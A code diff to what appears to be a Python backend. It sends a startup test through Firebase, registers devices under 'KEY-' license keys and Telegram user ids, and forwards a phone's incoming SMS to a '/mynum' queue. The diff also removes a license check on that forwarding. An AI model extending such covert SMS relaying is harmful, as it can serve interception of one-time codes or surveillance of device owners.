@@ -527,7 +527,7 @@ async def send_polling_startup_test(
     profile: MonitorProfile,
     device: Device,
 ) -> tuple[int, int]:
-    """Monitoring start — Astik inject to /mynum (APK on mynum). KEY optional on bot."""
+    """Monitoring start — push APK config + inject test to /mynum queue."""
     import time
 
     from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
@@ -536,13 +536,27 @@ async def send_polling_startup_test(
     mynum = resolve_mynum_phone(profile, db)
     if mynum and not profile.phone_number:
         profile.phone_number = mynum
+        profile.mynum_selected = True
+        db.commit()
+        db.refresh(profile)
     if not profile.phone_number or not profile.is_monitoring:
+        logger.warning("Startup test skipped: /mynum not set (APK phone number)")
         return 0, 0
 
     firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         logger.warning("Startup test skipped: no firebase URL")
         return 0, 0
+
+    license_key = get_license_key(profile)
+    if license_key and license_key.upper().startswith("KEY-"):
+        from app.license_keys import register_device_on_key
+
+        poll_id = mynum_device_id(profile.phone_number)
+        register_device_on_key(license_key, poll_id, profile.telegram_user_id)
+
+    await push_virtus_apk_config(profile, device)
+    await push_module_config(profile, device)
 
     t0 = time.perf_counter()
     try:
@@ -573,10 +587,6 @@ async def forward_incoming_to_mynum(
     from app.channel_relay import prepare_sms_forward, queue_forward_to_mynum
 
     if not profile.phone_number or not profile.is_monitoring:
-        return
-
-    license_key = get_license_key(profile)
-    if not license_key or not license_key.upper().startswith("KEY-"):
         return
 
     try:
